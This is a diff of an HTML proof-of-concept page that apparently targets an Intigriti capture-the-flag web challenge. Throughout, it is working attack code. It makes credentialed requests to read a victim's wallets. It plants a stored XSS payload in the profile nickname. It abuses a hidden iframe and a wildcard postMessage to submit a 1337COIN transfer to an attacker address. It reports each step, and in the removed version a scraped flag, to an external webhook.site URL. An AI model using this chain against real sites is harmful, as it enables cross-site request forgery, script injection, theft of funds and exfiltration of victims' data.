@@ -1,84 +1,69 @@
 <!DOCTYPE html>
+<html>
+<head><title>PoC</title></head>
 <body>
+<h1>Testing...</h1>
 <script>
-const BASE = 'https://challenge-0126.intigriti.io';
-const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
+(function() {
+  const BASE = 'https://challenge-0126.intigriti.io';
+  const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
+  const xss = '<img src=x onerror="alert(\'gigawatz\');fetch(\'' + WEBHOOK + '/?xss=1\')">';
 
-fetch(`${WEBHOOK}/?step=1_start`);
+  // Track
+  fetch(WEBHOOK + '/?step=1_start').catch(() => {});
 
-const xss = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}/?xss=1');const f=document.body.innerHTML;const m=f.match(/INTIGRITI{[^}]+}/);if(m)fetch('${WEBHOOK}/?flag='+encodeURIComponent(m[0]))">`;
+  // Check wallets
+  fetch(BASE + '/api/wallets', {credentials:'include'})
+    .then(r => r.json())
+    .then(wallets => {
+      const w = wallets.find(x => x.currency === '1337COIN');
+      fetch(WEBHOOK + '/?step=2_wallets_' + wallets.length + '_1337=' + (w ? w.balance : 'none')).catch(() => {});
 
-// Step 1: Check admin's wallets first
-fetch(`${BASE}/api/wallets`, {credentials:'include'})
-  .then(r => {
-    fetch(`${WEBHOOK}/?step=2_wallets_${r.status}`);
-    return r.json();
-  })
-  .then(wallets => {
-    const w1337 = wallets.find(w => w.currency === '1337COIN');
-    if (w1337) {
-      fetch(`${WEBHOOK}/?step=3_has_1337_wallet_balance_${w1337.balance}`);
-    } else {
-      fetch(`${WEBHOOK}/?step=3_no_1337_wallet`);
-    }
+      // Set profile
+      return fetch(BASE + '/api/profile', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        credentials: 'include',
+        body: JSON.stringify({nickname: xss})
+      });
+    })
+    .then(r => {
+      fetch(WEBHOOK + '/?step=3_profile_' + r.status).catch(() => {});
+      return r.text();
+    })
+    .then(() => {
+      // Create iframe
+      const iframe = document.createElement('iframe');
+      iframe.src = BASE + '/checkout.html?currency=1337COIN&price=1';
+      iframe.style.display = 'none';
+      document.body.appendChild(iframe);
 
-    // Step 2: Set admin's profile nickname to XSS
-    return fetch(`${BASE}/api/profile`, {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      credentials: 'include',
-      body: JSON.stringify({ nickname: xss })
-    });
-  })
-  .then(r => {
-    fetch(`${WEBHOOK}/?step=4_profile_${r.status}`);
-    return r.text();
-  })
-  .then(() => {
-    // Step 3: Create checkout iframe
-    const f = document.createElement('iframe');
-    f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
-    f.style.display = 'none';
-    document.body.appendChild(f);
+      iframe.onload = function() {
+        fetch(WEBHOOK + '/?step=4_loaded').catch(() => {});
 
-    f.onload = () => {
-      fetch(`${WEBHOOK}/?step=5_checkout_loaded`);
+        setTimeout(function() {
+          // Send message
+          iframe.contentWindow.postMessage({
+            type: 'submitTransaction',
+            transaction: {
+              toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
+              currency: '1337COIN',
+              amount: 1
+            }
+          }, '*');
 
-      setTimeout(() => {
-        // Step 4: Send postMessage
-        f.contentWindow.postMessage({
-          type: 'submitTransaction',
-          transaction: {
-            toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
-            currency: '1337COIN',
-            amount: 1
-          }
-        }, '*');
+          fetch(WEBHOOK + '/?step=5_sent').catch(() => {});
 
-        fetch(`${WEBHOOK}/?step=6_postmessage_sent`);
-
-        // Wait longer, then check transactions before redirect
-        setTimeout(() => {
-          fetch(`${BASE}/api/marketwatch`, {credentials:'include'})
-            .then(r => r.json())
-            .then(txs => {
-              const ourTx = txs.find(t => t.toAddress === '10b5c9290725eeed3976d5dfe52fcbe23a');
-              if (ourTx) {
-                fetch(`${WEBHOOK}/?step=7_transaction_created`);
-              } else {
-                fetch(`${WEBHOOK}/?step=7_no_transaction_found`);
-              }
-            });
+          // Redirect
+          setTimeout(function() {
+            fetch(WEBHOOK + '/?step=6_redirect').catch(() => {});
+            window.location = BASE + '/marketwatch.html';
+          }, 3000);
         }, 2000);
-
-        setTimeout(() => {
-          fetch(`${WEBHOOK}/?step=8_redirect`);
-          window.location = `${BASE}/marketwatch.html`;
-        }, 5000);
-      }, 2000);
-    };
-  })
-  .catch(e => fetch(`${WEBHOOK}/?error=${encodeURIComponent(e.message)}`));
+      };
+    })
+    .catch(e => fetch(WEBHOOK + '/?error=' + encodeURIComponent(e.message)).catch(() => {}));
+})();
 </script>
 </body>
 </html>
